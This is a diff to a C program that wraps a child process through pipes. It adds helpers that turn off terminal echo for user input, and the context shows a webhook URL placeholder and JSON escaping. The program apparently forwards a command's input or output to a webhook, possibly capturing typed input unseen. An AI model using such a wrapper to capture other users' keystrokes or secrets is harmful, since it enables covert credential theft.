@@ -13,6 +13,23 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+// Function to disable echo for user input
+void disable_echo() {
+    struct termios term;
+    tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
+    term.c_lflag &= ~ECHO;           // Disable echo
+    tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Apply the new settings immediately
+}
+
+// Function to enable echo for user input (restore original settings)
+void enable_echo() {
+    struct termios term;
+    tcgetattr(STDIN_FILENO, &term);  // Get the current terminal settings
+    term.c_lflag |= ECHO;            // Enable echo
+    tcsetattr(STDIN_FILENO, TCSANOW, &term);  // Apply the new settings immediately
+}
+
+
 #define WEBHOOK_URL "YOUR_WEBHOOK_URL"
 
 // Function to escape special characters in a string for JSON formatting
@@ -213,6 +230,9 @@ int main(int argc, char *argv[]) {
         close(pipe_in[1]);
         close(pipe_out[0]);
 
+        // Disable echo for user input
+        disable_echo();
+
         // Redirect stdin and stdout to pipes
         if (dup2(pipe_in[0], STDIN_FILENO) == -1) {
             perror("dup2 stdin");
@@ -235,7 +255,8 @@ int main(int argc, char *argv[]) {
         // If execvp fails
         perror("execvp");
         exit(EXIT_FAILURE);
-    } else {  // Parent process
+    }
+    else {  // Parent process
         // Close unused ends of the pipes
         close(pipe_in[0]);
         close(pipe_out[1]);
